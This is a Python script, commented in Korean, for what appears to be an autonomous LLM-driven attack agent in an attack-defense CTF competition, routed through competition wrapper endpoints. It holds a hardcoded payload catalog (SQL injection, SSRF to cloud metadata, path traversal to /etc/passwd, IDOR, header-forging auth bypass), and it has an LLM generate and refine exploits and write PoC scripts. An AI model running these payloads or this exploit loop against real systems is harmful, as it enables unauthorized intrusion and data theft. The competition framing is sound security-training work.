"""
Attack agent (team2) - 템플릿 기준 + 취약점 카탈로그 자동 탐색 버전

자동 탐색 루프:
  1. load_target_repo_context() : 타겟 repo 스냅샷 분석
  2. build_catalog()            : 고정 카탈로그(안전망) + AI가 repo 보고 추가 (혼합)
  3. for 각 vuln: attack -> 깃발 확인 -> 막히면 페이로드 바꿔 재시도
  4. 성공 시 build_poc()로 자동 PoC 생성 후 submit_poc()
  5. 다음 vuln 계속 탐색, 턴 소진/카탈로그 소진 시 finish()

규칙 준수:
  - LLM/공격/PoC 제출 전부 wrapper 경유, 개인 key 금지
  - 타겟 IP 직접 호출 금지, PoC에 flag 하드코딩 금지
"""
from __future__ import annotations

import io
import json
import os
import re
import tarfile
from dataclasses import dataclass
from pathlib import Path
from typing import Any

import httpx

MODEL = os.getenv("MODEL", "openai/gpt-4o-mini")
MAX_REPO_FILES = int(os.getenv("MAX_REPO_FILES", "24"))
MAX_REPO_PROMPT_BYTES = int(os.getenv("MAX_REPO_PROMPT_BYTES", str(48 * 1024)))
MAX_REPO_FILE_BYTES = int(os.getenv("MAX_REPO_FILE_BYTES", str(8 * 1024)))
MAX_RETRY_PER_VULN = int(os.getenv("MAX_RETRY_PER_VULN", "2"))

TEXT_SUFFIXES = {
    ".py", ".js", ".ts", ".tsx", ".jsx", ".json", ".yaml", ".yml",
    ".toml", ".ini", ".cfg", ".md", ".txt", ".html", ".css", ".sh",
}
IMPORTANT_NAMES = {
    "dockerfile", "requirements.txt", "pyproject.toml", "package.json",
    "vuln_spec.json", "app.py", "main.py", "server.py",
}
SKIP_DIRS = {
    ".git", "__pycache__", ".pytest_cache", ".mypy_cache",
    ".venv", "venv", "node_modules", "dist", "build",
}

# ----------------------------------------------------------------------
# 고정 취약점 카탈로그 (안전망) - AI가 못 찾아도 이건 항상 시도한다
# 각 항목은 "유형 + 시도해볼 페이로드 패턴" 이다.
# ----------------------------------------------------------------------
VULN_CATALOG = [
    {"type": "idor",
     "hint": "객체 id를 남의 값으로 바꿔 권한 우회 (report_id, session_id, user_id)",
     "candidates": [
         {"path": "/api/analysis", "method": "GET", "query": {"report_id": "1"}},
         {"path": "/api/reports/1", "method": "GET"},
         {"path": "/files", "method": "GET", "query": {"id": "1"}},
     ]},
    {"type": "sqli",
     "hint": "검색/필터 파라미터에 SQL 주입 (time-based blind, UNION)",
     "candidates": [
         {"path": "/search", "method": "GET",
          "query": {"q": "x' UNION SELECT id,value,null FROM flags--"}},
         {"path": "/search", "method": "GET",
          "query": {"q": "x' OR '1'='1"}},
     ]},
    {"type": "ssrf",
     "hint": "외부 링크/URL 파라미터로 내부 메타데이터 접근",
     "candidates": [
         {"path": "/link-preview", "method": "GET",
          "query": {"url": "http://169.254.169.254/latest/meta-data/"}},
         {"path": "/fetch", "method": "GET",
          "query": {"url": "http://localhost/"}},
     ]},
    {"type": "path_traversal",
     "hint": "파일 경로 파라미터로 상위 디렉토리 탈출",
     "candidates": [
         {"path": "/file", "method": "GET",
          "query": {"path": "../../etc/passwd"}},
         {"path": "/download", "method": "GET",
          "query": {"file": "../../../flag"}},
     ]},
    {"type": "auth_bypass",
     "hint": "인증 헤더 누락/위조, 내부용 헤더로 권한 우회",
     "candidates": [
         {"path": "/internal/report-stats", "method": "GET",
          "headers": {"X-Internal-Service": "vault-analyzer",
                      "User-Agent": "StudyCompass/1.0"},
          "query": {"report_id": "1"}},
         {"path": "/admin/check", "method": "GET"},
     ]},
    {"type": "info_exposure",
     "hint": "export/내보내기에서 소유자 검사 누락",
     "candidates": [
         {"path": "/export/report", "method": "GET",
          "query": {"report_id": "1", "format": "full"}},
         {"path": "/api/extensions/list", "method": "GET",
          "query": {"include": "config", "format": "full"}},
     ]},
]


@dataclass(frozen=True)
class AgentEnv:
    team_id: str
    target_team: str
    round_num: int
    run_id: str
    run_token: str
    openrouter_base_url: str
    agent_base_url: str

    @classmethod
    def from_env(cls) -> "AgentEnv":
        return cls(
            team_id=os.environ["TEAM_ID"],
            target_team=os.environ["TARGET_TEAM"],
            round_num=int(os.environ["ROUND"]),
            run_id=os.environ["AGENT_RUN_ID"],
            run_token=os.environ["AGENT_RUN_TOKEN"],
            openrouter_base_url=os.environ["OPENROUTER_BASE_URL"].rstrip("/"),
            agent_base_url=os.environ["HSPACE_AGENT_BASE_URL"].rstrip("/"),
        )

    @property
    def auth(self) -> dict[str, str]:
        return {"Authorization": f"Bearer {self.run_token}"}


def _check_response(resp, label):
    if resp.status_code >= 400:
        raise RuntimeError(f"{label} failed: HTTP {resp.status_code} {resp.text[:300]}")


def call_llm(env, *, purpose, messages, max_tokens, temperature=0.2):
    resp = httpx.post(
        f"{env.openrouter_base_url}/chat/completions",
        headers={**env.auth, "X-Agent-Purpose": purpose},
        json={"model": MODEL, "messages": messages,
              "temperature": temperature, "max_tokens": max_tokens},
        timeout=75.0,
    )
    _check_response(resp, "LLM wrapper")
    data = resp.json()
    llm_call_id = resp.headers.get("X-LLM-Call-ID") or (data.get("hspace") or {}).get("llm_call_id")
    if not llm_call_id:
        raise RuntimeError("LLM wrapper response did not include X-LLM-Call-ID")
    choices = data.get("choices") or []
    content = ((choices[0] if choices else {}).get("message") or {}).get("content") or ""
    return int(llm_call_id), content


def finish(env, status, error=""):
    try:
        httpx.post(f"{env.agent_base_url}/finish", headers=env.auth,
                   json={"status": status, "error": error}, timeout=10.0)
    except Exception as exc:
        print(f"finish failed: {exc}")


def fetch_target_repo(env, dest="target_repo"):
    resp = httpx.get(f"{env.agent_base_url}/target-repo.tar", headers=env.auth, timeout=30.0)
    _check_response(resp, "target repo fetch")
    repo_team = resp.headers.get("X-Repo-Team") or env.target_team
    commit = resp.headers.get("X-Repo-Commit") or ""
    dest_root = (Path(dest) / env.run_id).resolve()
    dest_root.mkdir(parents=True, exist_ok=True)
    with tarfile.open(fileobj=io.BytesIO(resp.content), mode="r:*") as archive:
        for member in archive.getmembers():
            member_path = (dest_root / member.name).resolve()
            member_path.relative_to(dest_root)
            if member.isdir():
                member_path.mkdir(parents=True, exist_ok=True)
                continue
            if not member.isfile():
                continue
            member_path.parent.mkdir(parents=True, exist_ok=True)
            extracted = archive.extractfile(member)
            if extracted is not None:
                member_path.write_bytes(extracted.read())
    return {"path": str(dest_root / repo_team), "team": repo_team, "commit": commit}


def attack_target(env, probe, llm_call_id):
    resp = httpx.post(
        f"{env.agent_base_url}/attack",
        headers=env.auth,
        json={
            "llm_call_id": llm_call_id,
            "payload": probe.get("payload") or "",
            "path": probe.get("path"),
            "method": probe.get("method") or "POST",
            "json_body": probe.get("json_body"),
            "query": probe.get("query"),
            "headers": probe.get("headers"),
            "data": probe.get("data"),
        },
        timeout=40.0,
    )
    _check_response(resp, "attack wrapper")
    return resp.json()


def submit_poc(env, *, flag_id, llm_call_id, source):
    resp = httpx.post(
        f"{env.agent_base_url}/pocs",
        headers=env.auth,
        data={"flag_id": flag_id, "llm_call_id": str(llm_call_id), "source": source},
        timeout=30.0,
    )
    _check_response(resp, "PoC submit wrapper")
    return resp.json()


def _json_from_text(text):
    match = re.search(r"```(?:json)?\s*(.*?)```", text, flags=re.S)
    raw = match.group(1) if match else text
    return json.loads(raw)


def _is_candidate_file(path):
    name = path.name.lower()
    return name in IMPORTANT_NAMES or path.suffix.lower() in TEXT_SUFFIXES


def _repo_file_priority(path):
    name = path.name.lower()
    if name == "vuln_spec.json":
        rank = 0
    elif name in {"app.py", "main.py", "server.py"}:
        rank = 1
    elif name in IMPORTANT_NAMES:
        rank = 2
    elif path.suffix.lower() == ".py":
        rank = 3
    else:
        rank = 4
    return rank, str(path)


def load_target_repo_context(env):
    info = fetch_target_repo(env)
    root = Path(info["path"])
    if not root.exists():
        raise RuntimeError(f"target repo snapshot missing: {root}")
    candidates = []
    for path in root.rglob("*"):
        if not path.is_file():
            continue
        if any(part in SKIP_DIRS for part in path.relative_to(root).parts):
            continue
        if _is_candidate_file(path):
            candidates.append(path)
    chunks = [f"Target repo team: {info.get('team')}",
              f"Target repo commit: {info.get('commit')}"]
    total_bytes = sum(len(c.encode("utf-8")) for c in chunks)
    included = 0
    for path in sorted(candidates, key=_repo_file_priority):
        if included >= MAX_REPO_FILES or total_bytes >= MAX_REPO_PROMPT_BYTES:
            break
        try:
            raw = path.read_bytes()
        except OSError:
            continue
        if b"\x00" in raw:
            continue
        text = raw[:MAX_REPO_FILE_BYTES].decode("utf-8", errors="replace")
        chunk = f"\n\n### {path.relative_to(root)}\n```\n{text}\n```"
        if total_bytes + len(chunk.encode("utf-8")) > MAX_REPO_PROMPT_BYTES:
            break
        chunks.append(chunk)
        total_bytes += len(chunk.encode("utf-8"))
        included += 1
    if included == 0:
        raise RuntimeError(f"no readable target repo files found under {root}")
    return info, "".join(chunks)


# ----------------------------------------------------------------------
# 혼합 카탈로그: AI가 repo 보고 만든 probe(우선) + 고정 카탈로그(백업)
# ----------------------------------------------------------------------
def build_catalog(env, repo_info, repo_context):
    """AI가 타겟 repo에 맞는 probe를 만들고, 그 뒤에 고정 카탈로그를 붙인다.
    반환: (scan_llm_call_id, [probe, ...])  각 probe엔 flag_id가 들어있다.
    """
    ai_probes = []
    scan_llm_call_id = 0
    try:
        scan_llm_call_id, content = call_llm(
            env, purpose="scan",
            messages=[
                {"role": "system", "content": (
                    "You are an autonomous CTF attack agent. Return only JSON. "
                    "Analyze the target repo snapshot and produce HTTP probes that map "
                    "each likely vulnerability to flag_id vuln1..vuln4. Consider IDOR, "
                    "SQLi (time-based/UNION), SSRF (169.254 metadata), path traversal, "
                    "auth bypass via headers, and info exposure via export endpoints.")},
                {"role": "user", "content": json.dumps({
                    "target_team": env.target_team,
                    "repo_commit": repo_info.get("commit"),
                    "known_possible_vuln_ids": ["vuln1", "vuln2", "vuln3", "vuln4"],
                    "required_output_shape": {"probes": [{
                        "flag_id": "vuln1", "type": "sqli",
                        "path": "/search", "method": "GET",
                        "query": {"q": "payload"}, "json_body": None}]},
                    "target_repo_snapshot": repo_context,
                }, ensure_ascii=False)},
            ],
            max_tokens=900,
        )
        parsed = _json_from_text(content)
        if isinstance(parsed, dict):
            parsed = parsed.get("probes", [])
        if isinstance(parsed, list):
            for it in parsed:
                if isinstance(it, dict) and it.get("flag_id"):
                    ai_probes.append({
                        "flag_id": str(it["flag_id"]),
                        "type": it.get("type", "ai"),
                        "path": it.get("path"),
                        "method": str(it.get("method") or "GET").upper(),
                        "query": it.get("query"),
                        "json_body": it.get("json_body"),
                        "headers": it.get("headers"),
                        "payload": it.get("payload") or "",
                    })
    except (RuntimeError, ValueError, json.JSONDecodeError) as exc:
        print(f"  [!] AI 카탈로그 생성 실패, 고정 카탈로그만 사용: {exc}")

    # 고정 카탈로그를 flag_id에 매핑해서 백업으로 붙임
    fixed_probes = []
    for idx, vuln in enumerate(VULN_CATALOG):
        flag_id = f"vuln{(idx % 4) + 1}"   # vuln1~4에 순환 매핑
        for cand in vuln["candidates"]:
            fixed_probes.append({
                "flag_id": flag_id, "type": vuln["type"],
                "path": cand.get("path"), "method": cand.get("method", "GET"),
                "query": cand.get("query"), "json_body": cand.get("json_body"),
                "headers": cand.get("headers"), "payload": "",
                "hint": vuln["hint"],
            })

    print(f"  카탈로그: AI {len(ai_probes)}개 + 고정 {len(fixed_probes)}개")
    return scan_llm_call_id, ai_probes + fixed_probes


def refine_probe(env, probe, last_observation, repo_context):
    """막혔을 때 직전 응답을 주고 같은 유형으로 페이로드만 바꿔 받는다."""
    try:
        llm_call_id, content = call_llm(
            env, purpose="scan",
            messages=[
                {"role": "system", "content": (
                    "Refine a failed CTF probe. Return only one JSON object with keys "
                    "path, method, query, json_body, headers, payload. Keep the same "
                    "vulnerability type but change the angle based on the response.")},
                {"role": "user", "content": json.dumps({
                    "vuln_type": probe.get("type"),
                    "hint": probe.get("hint", ""),
                    "previous_probe": {k: probe.get(k) for k in
                                       ("path", "method", "query", "json_body", "headers")},
                    "previous_response": {
                        "flags_found": last_observation.get("flags_found", []),
                        "tool_calls": last_observation.get("tool_calls", [])},
                    "repo_excerpt": repo_context[:8000],
                }, ensure_ascii=False)},
            ],
            max_tokens=400,
        )
        obj = _json_from_text(content)
    except (RuntimeError, ValueError, json.JSONDecodeError):
        return 0, None
    if not isinstance(obj, dict):
        return 0, None
    refined = dict(probe)
    for k in ("path", "method", "query", "json_body", "headers", "payload"):
        if obj.get(k) is not None:
            refined[k] = obj[k]
    return llm_call_id, refined


def build_poc(env, flag_id, probe, observation, repo_info, repo_context):
    """성공한 probe로 PoC 파이썬 파일을 LLM이 생성."""
    llm_call_id, content = call_llm(
        env, purpose="poc",
        messages=[
            {"role": "system", "content": (
                "You are an autonomous CTF exploit developer. Return only a single Python file. "
                "The script must read TARGET_HOST and TARGET_PORT, may use TARGET_TEAM and FLAG_ID. "
                "Send the reproducing request to the target and print the extracted HSPACE{...} "
                "flag as the final non-empty stdout line. Use only the Python standard library.")},
            {"role": "user", "content": json.dumps({
                "target_team": env.target_team,
                "flag_id": flag_id,
                "successful_probe": probe,
                "observation": {"flags_found": observation.get("flags_found", [])},
                "target_repo_snapshot": repo_context[:20000],
            }, ensure_ascii=False)},
        ],
        max_tokens=1200,
    )
    source = content.strip()
    match = re.search(r"```(?:python)?\s*(.*?)```", source, flags=re.S)
    if match:
        source = match.group(1).strip()
    compile(source, f"poc_{env.target_team}_{flag_id}.py", "exec")
    return llm_call_id, source + "\n"


def _find_flag(observation):
    """응답 전체 문자열에서 HSPACE 패턴 탐색 (중첩 대비)."""
    text = json.dumps(observation, ensure_ascii=False)
    return bool(re.search(r"HSPACE\{[^}]*\}", text)) and observation.get("flags_found")


def hunt_one(env, probe, scan_llm_call_id, repo_context):
    """한 probe를 막히면 페이로드 바꿔가며 최대 N회 시도. 성공 시 (result, winning)."""
    current = probe
    llm_call_id = scan_llm_call_id or 0
    last_result = {}
    for attempt in range(1 + MAX_RETRY_PER_VULN):
        # llm_call_id가 0이면 공격 직전 LLM을 한 번 호출해 확보
        if not llm_call_id:
            llm_call_id, _ = call_llm(env, purpose="scan",
                                      messages=[{"role": "user", "content": "prep"}],
                                      max_tokens=16)
        result = attack_target(env, current, llm_call_id)
        last_result = result
        turns = result.get("turns_remaining")
        print(f"    [{probe['flag_id']}/{probe.get('type')}] 시도{attempt+1}: "
              f"flags={len(result.get('flags_found', []))} turns_left={turns}")
        if _find_flag(result):
            return result, current
        if isinstance(turns, int) and turns <= 0:
            print("    [!] 턴 소진")
            break
        if attempt >= MAX_RETRY_PER_VULN:
            break
        llm_call_id, refined = refine_probe(env, current, result, repo_context)
        if not refined:
            break
        current = refined
        print("    [재시도] 페이로드 변경")
    return last_result, None


def main():
    env = AgentEnv.from_env()
    print(f"[{env.team_id}] attack run {env.run_id} target={env.target_team} round={env.round_num}")
    try:
        repo_info, repo_context = load_target_repo_context(env)
        print(f"  repo {repo_info.get('team')}@{str(repo_info.get('commit',''))[:12]} loaded")

        scan_llm_call_id, catalog = build_catalog(env, repo_info, repo_context)

        solved = set()   # 이미 깃발 찾은 flag_id는 건너뜀
        for probe in catalog:
            flag_id = probe["flag_id"]
            if flag_id in solved:
                continue
            try:
                result, winning = hunt_one(env, probe, scan_llm_call_id, repo_context)
                if not winning:
                    continue
                poc_llm_call_id, source = build_poc(
                    env, flag_id, winning, result, repo_info, repo_context)
                submitted = submit_poc(
                    env, flag_id=flag_id, llm_call_id=poc_llm_call_id, source=source)
                solved.add(flag_id)
                print(f"  [+] {flag_id} PoC 제출: {submitted}")
            except (RuntimeError, ValueError, SyntaxError) as exc:
                print(f"  probe {flag_id} failed: {exc}")

        finish(env, "completed")
    except Exception as exc:
        finish(env, "failed", str(exc))
        raise


if __name__ == "__main__":
    main()